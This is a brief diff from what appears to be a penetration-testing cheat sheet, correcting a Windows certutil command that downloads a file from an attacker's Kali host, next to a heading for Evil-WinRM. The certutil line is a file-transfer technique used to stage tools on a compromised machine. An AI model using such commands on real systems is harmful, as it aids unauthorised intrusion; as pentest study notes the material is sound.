@@ -57,7 +57,7 @@ python3 -m http.server
 On Windows:
 
 ```
-certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file
+certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file name_of_file
 ```
 
 ### Evil-WinRM
